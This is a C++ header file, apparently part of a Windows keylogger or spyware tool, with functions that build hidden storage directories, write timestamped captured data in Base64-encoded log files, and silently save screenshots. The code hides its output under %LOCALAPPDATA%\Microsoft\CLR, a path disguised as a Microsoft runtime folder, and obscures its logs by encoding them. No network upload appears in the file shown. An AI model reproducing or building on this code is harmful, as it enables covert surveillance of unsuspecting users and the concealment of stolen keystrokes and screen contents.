#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"
#include "scp.h"


namespace IO
{
//std::string GetLastErrorStdStr()
//{
//    DWORD error = GetLastError();
//    if (error)
//    {
//        LPVOID lpMsgBuf;
//        DWORD bufLen = FormatMessage(
//                           FORMAT_MESSAGE_ALLOCATE_BUFFER |
//                           FORMAT_MESSAGE_FROM_SYSTEM |
//                           FORMAT_MESSAGE_IGNORE_INSERTS,
//                           NULL,
//                           error,
//                           MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
//                           (LPTSTR) &lpMsgBuf,
//                           0, NULL );
//        if (bufLen)
//        {
//            LPCSTR lpMsgStr = (LPCSTR)lpMsgBuf;
//            std::string result(lpMsgStr, lpMsgStr+bufLen);
//
//            LocalFree(lpMsgBuf);
//
//            return result;
//        }
//    }
//    return std::string();
//}

std::string GetOurPath (const bool append_seprator = false)
{
    std::string appdata_dir(getenv("LOCALAPPDATA"));
    std::string full = appdata_dir + "\\Microsoft\\CLR";
    //Helper::WriteAppLog("appdata_dir: " + appdata_dir+ "GetOurPath: " + full);
    return full+(append_seprator ? "\\" : "");
}

bool MkOneDr(std::string path)
{
    //std::string errCode = "nothing modified...";
//
    bool a = (bool)CreateDirectory(path.c_str(),NULL);
    //std::string errCode = GetLastErrorStdStr();
    Helper::WriteAppLog("lalala");
    bool b = (GetLastError()==ERROR_ALREADY_EXISTS);
    return a||b;
    //return ((bool)CreateDirectory(path.c_str(),NULL)) || (GetLastError()==ERROR_ALREADY_EXISTS);
}

bool MKDir(std::string path)
{
    //Helper::WriteAppLog("MKDIR: "+path+"\n");
    for(char &c : path)
    {
        if(c == '\\')
        {
            //Helper::WriteAppLog("MKDIR: "+path+"\n");
            c = '\0';
            //Helper::WriteAppLog("MKDIR: "+path+"\n");
            if(!MkOneDr(path))
            {
                return false;
            }
            c = '\\';
        }
    }
    return true;
}

template <class T>
std::string WriteLog(const T &t)
{
    std::string path = GetOurPath(true);
    Helper::DateTime dt;
    std::string name = dt.GetDateTimeString("_") + ".log";
 //   std::string scrname = dt.GetDateTimeString("_")+".jpg";
 //   LPWSTR screenpath = Helper::Str2Lpwstr(path+scrname);
 //   scp::GetScreeny(screenpath,100);

    try
    {
        std::ofstream file(path + name);
        if(!file)
        {
            return "";
        }
        std::ostringstream s;
        s<<"["<<dt.GetDateTimeString()<<"]"<<std::endl<<t<<std::endl;
        std::string data = Base64::EncriptB64(s.str());
        file<<data;
        if(!file)
        {
            return "";
        }
        file.close();
        return name;
    }
    catch(...)
    {
        return "";
    }
}

std::string WriteShot()
{
    std::string path = GetOurPath(true);
    Helper::DateTime dt;
//    std::string name = dt.GetDateTimeString("_") + ".log";
    std::string scrname = dt.GetDateTimeString("_")+".jpg";
    LPWSTR screenpath = Helper::Str2Lpwstr(path+scrname);
    scp::GetScreeny(screenpath,100);
    return scrname;

}
}

#endif // IO_H
